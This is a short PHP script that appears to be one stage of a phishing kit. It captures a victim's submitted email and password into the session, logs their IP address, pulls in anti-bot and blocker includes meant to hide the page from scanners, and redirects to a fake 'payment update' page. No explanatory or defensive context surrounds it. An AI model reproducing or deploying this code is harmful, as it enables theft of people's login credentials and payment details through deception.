<?php
############## include ############## ^_^!
session_start();
include('../blocker.php');
include('../antibots.php');
$ip = getenv("REMOTE_ADDR");
############## Config Login ########## ^_^!
$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];
############## Header ############## ^_^!
header("LOCATION: ../websc_payment/?ID=Update&CN=".$cn."&date&".gmdate ("H-i-s")."&ip&".$ip."/update.html?NetdKey=".md5('Adnan-7eza9')." ");
############## Sdina ############## ^_^!
?>